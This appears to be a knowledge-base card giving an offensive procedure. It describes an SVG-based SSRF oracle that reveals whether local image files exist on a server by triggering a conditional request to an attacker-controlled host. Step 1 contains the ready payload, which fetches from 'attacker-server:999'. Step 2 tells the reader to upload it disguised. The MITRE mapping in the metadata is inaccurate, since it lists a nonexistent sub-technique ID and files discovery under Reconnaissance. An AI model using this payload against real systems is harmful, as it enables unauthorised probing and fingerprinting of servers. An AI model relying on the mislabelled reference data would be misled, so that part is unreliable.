---
tags:
  - oracle
  - file-detection
  - ssrf
type: procedure
tools: []
tactics:
  - '[[Reconnaissance]]'
commands: []
platforms:
  - Linux
  - Web
techniques:
  - '[[File and Directory Discovery]]'
skill_level: advanced
impact_level: high
detection_risk: low
sub_techniques:
  - '[[T1083.001]]'
id: 7ccf058b-df55-4119-b829-f1382aa75028
created_at: '2025-12-14T03:46:14.353Z'
updated_at: '2025-12-14T03:46:14.353Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Implement Is-Picture-Present-Oracle for Local Images

## Summary

Creates a conditional SSRF oracle that reveals local image file existence by chaining a local path check with an external request, limited to valid images.

## Description

The parser only fetches the second <image> if the first local one is present and valid, acting as an oracle. This discloses filesystem details without direct read, e.g., /lib/plymouth/ubuntu_logo.png presence.

## Requirements

1. Guessed local image paths (e.g., from Linux distros)
2. Attacker server on unique port (e.g., 999) for distinction

## Defense

Defensive measures and detection strategies:

- Disable local file access in image parsers
- Monitor for chained external requests post-local attempts
- Validate all local paths in processing logs

## Objectives

1. Detect specific image files
2. Infer OS/packages
3. Enable fingerprinting

## Instructions

### Step 1: Construct Oracle SVG

**Context**: Dual <image> for conditional fetch.

<svg> <image xlink:href="/lib/plymouth/ubuntu_logo.png" /> <image xlink:href="http://attacker-server:999/example.png" /> </svg>

> If first valid, second fetches.

### Step 2: Upload and Check External Log

**Context**: Trigger and observe.

Upload disguised; request to :999 indicates presence.

> Non-images like /etc/passwd won't trigger.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance

### Techniques

- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques

- [[T1083.001]] Local File Enumeration

## Commands Used


## Tools Used


## Tags

- [[oracle]]
- [[fingerprinting]]
